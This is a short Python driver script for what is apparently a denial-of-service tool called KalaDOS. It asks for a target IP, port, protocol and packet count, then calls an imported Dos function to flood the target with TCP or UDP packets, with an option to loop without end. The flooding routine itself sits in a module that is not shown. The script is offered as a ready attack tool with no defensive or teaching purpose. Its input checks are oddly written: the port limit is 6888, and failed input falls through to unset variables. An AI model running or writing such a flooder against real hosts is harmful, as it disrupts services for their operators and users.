from .KalaDOS import SendTcpPacket,SendUdpPacket,Dos
from rich import print

if __name__ == "__main__":
    try:
        target_ip = input("Enter the Target IP: ")
        target_port = int(input("Enter the target port: "))
    
    # Ensure the target port is within the valid range
        while target_port <= 0 or target_port >= 6888:
            target_port = int(input("Invalid port! Enter the target port (between 1 and 6888): "))

    # Normalize protocol input to avoid case sensitivity issues
        protocol = input("Enter the protocol to send (tcp/udp): ").lower()

    # Get count of packets or 0 for infinite loop
        count = int(input("Enter count or 0 for infinite loop: "))

    except KeyboardInterrupt:
        exit()
    except Exception as e:
        print(e)    
    # TCP protocol handling
    if protocol == "tcp":
        if count > 0:
            Dos(target_ip=target_ip, target_port=target_port, protocol="tcp", count=False, value=count)
        else:
            Dos(target_ip=target_ip, target_port=target_port, protocol="tcp", count=True)

    # UDP protocol handling
    elif protocol == "udp":
        if count > 0:
            Dos(target_ip=target_ip, target_port=target_port, protocol="udp", count=False, value=count)
        else:
            Dos(target_ip=target_ip, target_port=target_port, protocol="udp", count=True)

    else:
        print("[bold red]Invalid protocol! Please enter either 'tcp' or 'udp'.")
